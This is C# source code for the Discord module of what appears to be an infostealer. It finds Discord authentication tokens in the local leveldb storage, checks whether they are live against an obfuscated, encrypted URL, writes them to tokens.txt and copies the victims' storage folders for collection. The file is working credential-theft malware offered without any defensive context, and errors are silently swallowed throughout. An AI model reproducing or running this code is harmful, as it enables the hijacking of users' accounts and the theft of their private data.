using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using Client.Modules.Manager;
using Client.Modules.Passwords.Helpers;

namespace Client.Modules.Passwords.Targets.Messengers;

internal sealed class Discord
{
	private static Regex TokenRegex = new Regex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}");

	private static string[] DiscordDirectories = new string[3] { "Discord\\Local Storage\\leveldb", "Discord PTB\\Local Storage\\leveldb", "Discord Canary\\leveldb" };

	public static void WriteDiscord(string[] lcDicordTokens, string sSavePath)
	{
		if (lcDicordTokens.Length != 0)
		{
			Directory.CreateDirectory(sSavePath);
			Counter.Discord = true;
			try
			{
				foreach (string text in lcDicordTokens)
				{
					File.AppendAllText(sSavePath + "\\tokens.txt", text + "\n");
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}
		try
		{
			CopyLevelDb(sSavePath);
		}
		catch
		{
		}
	}

	private static void CopyLevelDb(string sSavePath)
	{
		string[] discordDirectories = DiscordDirectories;
		foreach (string path in discordDirectories)
		{
			string text = Path.Combine(Paths.appdata, path);
			string destFolder = Path.Combine(sSavePath, new DirectoryInfo(text).Name);
			if (Directory.Exists(text))
			{
				try
				{
					Filemanager.CopyDirectory(text, destFolder);
				}
				catch
				{
				}
			}
		}
	}

	private static string TokenState(string token)
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.Headers.Add("Authorization", token);
			return webClient.DownloadString(StringsCrypt.Decrypt(new byte[48]
			{
				204, 119, 158, 154, 23, 66, 149, 141, 183, 108,
				94, 12, 88, 31, 176, 188, 18, 22, 179, 36,
				224, 199, 140, 191, 17, 128, 191, 221, 16, 110,
				63, 145, 150, 152, 246, 105, 199, 84, 221, 181,
				90, 40, 214, 128, 166, 54, 252, 46
			})).Contains("Unauthorized") ? "Token is invalid" : "Token is valid";
		}
		catch
		{
		}
		return "Connection error";
	}

	public static string[] GetTokens()
	{
		List<string> list = new List<string>();
		try
		{
			string[] discordDirectories = DiscordDirectories;
			foreach (string path in discordDirectories)
			{
				string text = Path.Combine(Paths.appdata, path);
				string text2 = Path.Combine(Path.GetTempPath(), new DirectoryInfo(text).Name);
				if (!Directory.Exists(text))
				{
					continue;
				}
				Filemanager.CopyDirectory(text, text2);
				string[] files = Directory.GetFiles(text2);
				foreach (string text3 in files)
				{
					if (text3.EndsWith(".log") || text3.EndsWith(".ldb"))
					{
						string input = File.ReadAllText(text3);
						Match match = TokenRegex.Match(input);
						if (match.Success)
						{
							list.Add(match.Value + " - " + TokenState(match.Value));
						}
					}
				}
				Filemanager.RecursiveDelete(text2);
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return list.ToArray();
	}
}
